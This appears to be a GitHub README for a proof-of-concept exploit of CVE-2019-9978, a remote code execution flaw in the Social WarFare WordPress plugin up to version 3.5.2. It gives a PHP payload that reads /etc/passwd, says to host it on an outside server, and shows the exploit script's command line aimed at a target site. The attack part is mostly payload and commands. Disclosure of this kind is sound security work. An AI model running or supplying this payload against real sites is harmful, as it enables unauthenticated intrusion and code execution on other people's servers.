# CVE-2019-9978
CVE-2019-9978 - (PoC) RCE in Social WarFare Plugin (&lt;=3.5.2)

## Description
Unauthenticated remote code execution has been discovered in functionality that handles settings import. A user can leverage the use of RFI to RCE. 

## PoC
Copy the following payload: 
```
<pre>system('cat /etc/passwd')</pre>
```
Save it with filename: `payload.txt` and upload it on a server. The URI should look like: `http(s)://yoursite.com/payload.txt`. Finally, supply your `--target` and `--payload-uri` options: 

```
$ python cve-2019-9978.py --target http://vulntarget.com \
                         --payload-uri http://yourpayloadsite.com/payload.txt

```
![Screenshot at 2019-05-03 11-15-02](https://user-images.githubusercontent.com/29171692/57122079-c50c0f00-6d94-11e9-8469-671685d0dbe7.png)

## Credits
Researcher: Luka Sikic<br>
Link: https://wpvulndb.com/vulnerabilities/9259?fbclid=IwAR2xLSnanccqwZNqc2c7cIv447Lt80mHivtyNV5ZXGS0ZaScxIYcm1XxWXM<br>
Author: [@hash3liZer](https://twitter.com/hash3liZer)<br>
